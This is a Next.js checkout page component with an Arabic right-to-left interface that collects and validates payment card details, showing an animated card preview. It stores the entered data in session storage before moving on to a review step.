"use client";

import { useState, useRef, useLayoutEffect, useEffect } from "react";
import { useRouter } from "next/navigation";
import Header from "../../components/Header";
import BottomNav from "../../components/BottomNav";
import { useSettings } from "@/lib/useSettings";
import { FormData } from "@/lib/types";

function formatCard(raw: string) {
  return raw.replace(/(.{4})(?=.)/g, "$1 ");
}

function CardNumberInput({ value, onChange, onBlur, hasError }: {
  value: string;
  onChange: (raw: string) => void;
  onBlur?: () => void;
  hasError?: boolean;
}) {
  const inputRef = useRef<HTMLInputElement>(null);
  const nextCursor = useRef<number | null>(null);

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const input = e.target;
    const cursorBefore = input.selectionStart ?? 0;
    const prevValue = input.value;
    const raw = prevValue.replace(/\D/g, "").slice(0, 16);
    const newFormatted = formatCard(raw);
    const deletedSpace = prevValue[cursorBefore] === " " && raw.length < value.length;
    const rawDigitsBefore = prevValue.slice(0, cursorBefore).replace(/\D/g, "").length;
    let digits = 0, pos = 0;
    for (pos = 0; pos <= newFormatted.length; pos++) {
      if (digits === rawDigitsBefore) break;
      if (pos < newFormatted.length && newFormatted[pos] !== " ") digits++;
    }
    nextCursor.current = deletedSpace ? Math.max(0, pos - 1) : pos;
    onChange(raw);
  };

  const handlePaste = (e: React.ClipboardEvent<HTMLInputElement>) => {
    e.preventDefault();
    const pasted = e.clipboardData.getData("text").replace(/\D/g, "").slice(0, 16);
    onChange(pasted);
    nextCursor.current = formatCard(pasted).length;
  };

  useLayoutEffect(() => {
    if (nextCursor.current !== null && inputRef.current) {
      inputRef.current.setSelectionRange(nextCursor.current, nextCursor.current);
      nextCursor.current = null;
    }
  });

  return (
    <input
      ref={inputRef}
      className={`w-full bg-surface-container-low border-none rounded-xl px-5 py-4 text-base text-on-surface focus:ring-2 focus:bg-white transition-all outline-none font-mono tracking-widest ${
        hasError ? "ring-2 ring-error/40" : "focus:ring-primary/20"
      }`}
      dir="ltr"
      style={{ textAlign: "left", unicodeBidi: "plaintext" }}
      value={formatCard(value)}
      onChange={handleChange}
      onPaste={handlePaste}
      onBlur={onBlur}
      placeholder="•••• •••• •••• ••••"
      maxLength={19}
      inputMode="numeric"
      autoComplete="cc-number"
      required
    />
  );
}

function detectCardType(num: string): "visa" | "mastercard" | "unknown" {
  if (num.startsWith("4")) return "visa";
  if (/^5[1-5]/.test(num) || /^2[2-7]/.test(num)) return "mastercard";
  return "unknown";
}

function CreditCard({ cardNumber, cardHolderName, expiryDate, cvv, flipped, cardType }: {
  cardNumber: string;
  cardHolderName: string;
  expiryDate: string;
  cvv: string;
  flipped: boolean;
  cardType: "visa" | "mastercard" | "unknown";
}) {
  const displayNumber = formatCard(cardNumber).padEnd(19, "•").split("");
  const groups = [displayNumber.slice(0, 4), displayNumber.slice(5, 9), displayNumber.slice(10, 14), displayNumber.slice(15, 19)];

  return (
    <div className="w-full flex justify-center mb-6 sm:mb-8 px-2 sm:px-0" style={{ perspective: "1000px" }}>
      <div
        className="relative w-full max-w-[340px] sm:max-w-sm transition-transform duration-700"
        style={{ aspectRatio: "1.586", transformStyle: "preserve-3d", transform: flipped ? "rotateY(180deg)" : "rotateY(0deg)" }}
      >
        <div
          className="absolute inset-0 rounded-2xl p-4 sm:p-6 flex flex-col justify-between overflow-hidden"
          style={{ backfaceVisibility: "hidden", WebkitBackfaceVisibility: "hidden", background: "linear-gradient(135deg, #1a1a2e 0%, #16213e 40%, #0f3460 100%)", boxShadow: "0 25px 50px -12px rgba(0,0,0,0.4)" }}
        >
          <div className="absolute inset-0 rounded-2xl" style={{ background: "linear-gradient(135deg, rgba(255,255,255,0.08) 0%, transparent 60%)" }} />
          <div className="flex justify-between items-start relative z-10">
            <div className="w-8 h-6 sm:w-10 sm:h-7 rounded-md" style={{ background: "linear-gradient(135deg, #d4af37, #f5d76e, #d4af37)", boxShadow: "0 2px 4px rgba(0,0,0,0.3)" }}>
              <div className="w-full h-full rounded-md grid grid-cols-2 gap-px p-1 opacity-60">
                <div className="bg-yellow-800/40 rounded-sm" /><div className="bg-yellow-800/40 rounded-sm" />
                <div className="bg-yellow-800/40 rounded-sm" /><div className="bg-yellow-800/40 rounded-sm" />
              </div>
            </div>
            <div className="text-white">
              {cardType === "visa" && <span className="font-black italic text-xl sm:text-2xl tracking-tight" style={{ fontFamily: "serif", textShadow: "0 1px 3px rgba(0,0,0,0.5)" }}>VISA</span>}
              {cardType === "mastercard" && (
                <div className="flex items-center">
                  <div className="w-6 h-6 sm:w-7 sm:h-7 rounded-full opacity-90" style={{ background: "#eb001b" }} />
                  <div className="w-6 h-6 sm:w-7 sm:h-7 rounded-full -ml-3 opacity-80" style={{ background: "#f79e1b" }} />
                </div>
              )}
              {cardType === "unknown" && <div className="w-8 h-5 sm:w-10 sm:h-6 rounded bg-white/10" />}
            </div>
          </div>
          <div className="flex gap-2 sm:gap-4 justify-center relative z-10" dir="ltr">
            {groups.map((g, i) => (
              <span key={i} className="font-mono text-white text-sm sm:text-lg tracking-widest" style={{ textShadow: "0 1px 3px rgba(0,0,0,0.5)", letterSpacing: "0.12em" }}>
                {g.join("")}
              </span>
            ))}
          </div>
          <div className="flex justify-between items-end relative z-10">
            <div className="min-w-0 flex-1 mr-3">
              <p className="text-white/50 text-[9px] sm:text-xs mb-0.5 uppercase tracking-widest">Card Holder</p>
              <p className="text-white font-semibold text-xs sm:text-sm uppercase tracking-wider truncate">{cardHolderName || "YOUR NAME"}</p>
            </div>
            <div className="text-right shrink-0">
              <p className="text-white/50 text-[9px] sm:text-xs mb-0.5 uppercase tracking-widest">Expires</p>
              <p className="text-white font-semibold text-xs sm:text-sm font-mono" dir="ltr">{expiryDate || "MM/YY"}</p>
            </div>
          </div>
        </div>

        <div
          className="absolute inset-0 rounded-2xl overflow-hidden flex flex-col justify-center"
          style={{ backfaceVisibility: "hidden", WebkitBackfaceVisibility: "hidden", transform: "rotateY(180deg)", background: "linear-gradient(135deg, #1a1a2e 0%, #16213e 40%, #0f3460 100%)", boxShadow: "0 25px 50px -12px rgba(0,0,0,0.4)" }}
        >
          <div className="w-full h-8 sm:h-10 mt-5 sm:mt-6" style={{ background: "#1a1a1a" }} />
          <div className="px-4 sm:px-6 mt-3 sm:mt-4">
            <p className="text-white/50 text-[9px] sm:text-xs mb-1 uppercase tracking-widest">CVV</p>
            <div className="w-full h-8 sm:h-10 rounded-md flex items-center px-3 sm:px-4" style={{ background: "rgba(255,255,255,0.9)" }}>
              <span className="font-mono text-gray-800 tracking-widest text-sm sm:text-base ml-auto" dir="ltr">
                {cvv ? "•".repeat(cvv.length) : "•••"}
              </span>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}

export default function CardPage() {
  const router = useRouter();
  const { settings, loading } = useSettings();
  const [flipped, setFlipped] = useState(false);
  const [touched, setTouched] = useState<Record<string, boolean>>({});
  const [card, setCard] = useState({ cardHolderName: "", cardNumber: "", cvv: "", expiryDate: "" });

  useEffect(() => {
    const saved = sessionStorage.getItem("formData");
    if (!saved) { router.replace("/checkout/details"); return; }
    const parsed: FormData = JSON.parse(saved);
    setCard({
      cardHolderName: "",
      cardNumber: parsed.cardNumber || "",
      cvv: parsed.cvv || "",
      expiryDate: parsed.expiryDate || "",
    });
  }, [router]);

  const touch = (key: string) => setTouched((p) => ({ ...p, [key]: true }));

  function validateCardNumber(v: string) {
    if (!v) return "رقم البطاقة مطلوب";
    if (v.length !== 16) return "رقم البطاقة يجب أن يكون 16 رقماً";
    let sum = 0;
    for (let i = 0; i < 16; i++) {
      let d = Number(v[15 - i]);
      if (i % 2 === 1) { d *= 2; if (d > 9) d -= 9; }
      sum += d;
    }
    if (sum % 10 !== 0) return "رقم البطاقة غير صحيح";
    return "";
  }

  function validateExpiry(v: string) {
    if (!v) return "تاريخ الانتهاء مطلوب";
    if (!/^\d{2}\/\d{2}$/.test(v)) return "صيغة التاريخ غير صحيحة (MM/YY)";
    const [mm, yy] = v.split("/").map(Number);
    if (mm < 1 || mm > 12) return "الشهر غير صحيح";
    const now = new Date();
    const expiry = new Date(2000 + yy, mm - 1, 1);
    if (expiry < new Date(now.getFullYear(), now.getMonth(), 1)) return "البطاقة منتهية الصلاحية";
    return "";
  }

  function validateCvv(v: string) {
    if (!v) return "رمز CVV مطلوب";
    if (v.length !== 3) return "رمز CVV يجب أن يكون 3 أرقام";
    return "";
  }

  const cardNumberError = validateCardNumber(card.cardNumber);
  const expiryError = validateExpiry(card.expiryDate);
  const cvvError = validateCvv(card.cvv);
  const cardType = detectCardType(card.cardNumber);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setTouched({ cardHolderName: true, cardNumber: true, expiryDate: true, cvv: true });
    if (!card.cardHolderName || cardNumberError || expiryError || cvvError) return;
    const saved = sessionStorage.getItem("formData");
    if (!saved) return;
    const merged: FormData = { ...JSON.parse(saved), ...card };
    sessionStorage.setItem("formData", JSON.stringify(merged));
    router.push("/checkout/review");
  };

  if (loading) {
    return <div className="flex-1 flex items-center justify-center"><div className="animate-spin h-8 w-8 border-4 border-primary border-t-transparent rounded-full" /></div>;
  }

  return (
    <>
      <Header storeName={settings.storeName} logoUrl={settings.logoUrl} />
      <main className="w-full max-w-2xl mx-auto px-2 sm:px-6 py-3 sm:py-14 mb-24" dir="rtl">

        <div className="flex flex-col items-center mb-6 sm:mb-10">
          <div className="flex items-center gap-2 mb-2">
            <span className="px-2.5 py-0.5 bg-primary/10 text-primary text-xs font-bold rounded-full tracking-widest uppercase">التحقق</span>
          </div>
          <h1 className="text-lg sm:text-3xl font-extrabold text-on-background tracking-tight">بيانات البطاقة البنكية</h1>
          <p className="text-secondary mt-1 sm:mt-2 text-xs sm:text-sm">الخطوة 3 من 4</p>
          <div className="flex gap-1.5 mt-4 sm:mt-6 w-full max-w-[240px] sm:max-w-sm">
            <div className="h-1.5 sm:h-2 w-full bg-primary rounded-full"></div>
            <div className="h-1.5 sm:h-2 w-full bg-primary rounded-full"></div>
            <div className="h-1.5 sm:h-2 w-full bg-primary rounded-full"></div>
            <div className="h-1.5 sm:h-2 w-full bg-surface-container-highest rounded-full"></div>
          </div>
        </div>

        <div className="bg-white rounded-2xl shadow-[0_8px_32px_0_rgba(0,0,0,0.06)] p-3 sm:p-8 md:p-10">
          <form onSubmit={handleSubmit} className="space-y-6 sm:space-y-10">

            <CreditCard
              cardNumber={card.cardNumber}
              cardHolderName={card.cardHolderName}
              expiryDate={card.expiryDate}
              cvv={card.cvv}
              flipped={flipped}
              cardType={cardType}
            />

            <div className="grid grid-cols-1 sm:grid-cols-2 gap-x-6 gap-y-5">

              <div className="flex flex-col gap-1 sm:col-span-2">
                <label className="text-sm sm:text-base font-semibold text-secondary px-1">اسم حامل البطاقة *</label>
                <input
                  className={`w-full bg-surface-container-low border-none rounded-xl px-4 py-3 sm:px-5 sm:py-4 text-sm sm:text-base text-on-surface focus:ring-2 focus:bg-white transition-all outline-none uppercase ${
                    touched.cardHolderName && !card.cardHolderName ? "ring-2 ring-error/40" : "focus:ring-primary/20"
                  }`}
                  value={card.cardHolderName}
                  onChange={(e) => setCard((p) => ({ ...p, cardHolderName: e.target.value }))}
                  onBlur={() => touch("cardHolderName")}
                  placeholder="أدخل الاسم كما هو مكتوب في البطاقة"
                  required
                />
                {touched.cardHolderName && !card.cardHolderName && (
                  <p className="text-error text-xs px-1 mt-0.5">اسم حامل البطاقة مطلوب</p>
                )}
              </div>

              <div className="flex flex-col gap-1 sm:col-span-2" dir="ltr">
                <label className="text-sm sm:text-base font-semibold text-secondary px-1" dir="rtl">رقم البطاقة *</label>
                <CardNumberInput
                  value={card.cardNumber}
                  onChange={(raw) => setCard((p) => ({ ...p, cardNumber: raw }))}
                  onBlur={() => touch("cardNumber")}
                  hasError={!!(touched.cardNumber && cardNumberError)}
                />
                {touched.cardNumber && cardNumberError && (
                  <p className="text-error text-xs px-1 mt-0.5" dir="rtl">{cardNumberError}</p>
                )}
              </div>

              <div className="flex flex-col gap-1">
                <label className="text-sm sm:text-base font-semibold text-secondary px-1">رمز CVV *</label>
                <input
                  className={`w-full bg-surface-container-low border-none rounded-xl px-4 py-3 sm:px-5 sm:py-4 text-sm sm:text-base text-on-surface focus:ring-2 focus:bg-white transition-all outline-none font-mono tracking-widest ${
                    touched.cvv && cvvError ? "ring-2 ring-error/40" : "focus:ring-primary/20"
                  }`}
                  value={card.cvv}
                  onChange={(e) => { setCard((p) => ({ ...p, cvv: e.target.value.replace(/\D/g, "") })); setFlipped(true); }}
                  onBlur={() => { setFlipped(false); touch("cvv"); }}
                  placeholder="•••"
                  maxLength={3}
                  inputMode="numeric"
                  required
                />
                {touched.cvv && cvvError && <p className="text-error text-xs px-1 mt-0.5">{cvvError}</p>}
              </div>

              <div className="flex flex-col gap-1">
                <label className="text-sm sm:text-base font-semibold text-secondary px-1">تاريخ انتهاء البطاقة *</label>
                <input
                  className={`w-full bg-surface-container-low border-none rounded-xl px-4 py-3 sm:px-5 sm:py-4 text-sm sm:text-base text-on-surface focus:ring-2 focus:bg-white transition-all outline-none font-mono tracking-widest ${
                    touched.expiryDate && expiryError ? "ring-2 ring-error/40" : "focus:ring-primary/20"
                  }`}
                  value={card.expiryDate}
                  onChange={(e) => {
                    let v = e.target.value.replace(/\D/g, "");
                    if (v.length >= 2) v = v.slice(0, 2) + "/" + v.slice(2, 4);
                    setCard((p) => ({ ...p, expiryDate: v }));
                  }}
                  onBlur={() => touch("expiryDate")}
                  placeholder="MM/YY"
                  maxLength={5}
                  inputMode="numeric"
                  required
                />
                {touched.expiryDate && expiryError && <p className="text-error text-xs px-1 mt-0.5">{expiryError}</p>}
              </div>
            </div>

            <div className="flex flex-col-reverse sm:flex-row items-stretch sm:items-center justify-between gap-3 pt-6">
              <button
                type="button"
                onClick={() => router.back()}
                className="w-full sm:w-auto px-6 py-3 sm:px-8 sm:py-4 rounded-xl bg-surface-container-high text-on-surface text-sm sm:text-base font-bold hover:bg-surface-container-highest transition-all text-center"
              >
                رجوع
              </button>
              <button
                type="submit"
                className="w-full sm:w-auto px-8 py-3 sm:px-10 sm:py-4 rounded-xl bg-gradient-to-br from-primary to-primary-container text-white text-sm sm:text-base font-bold shadow-[0_8px_20px_-4px_rgba(0,110,47,0.3)] hover:scale-[1.02] active:scale-95 transition-all text-center"
              >
                المتابعة للخطوة التالية
              </button>
            </div>
          </form>
        </div>
      </main>
      <BottomNav />
    </>
  );
}
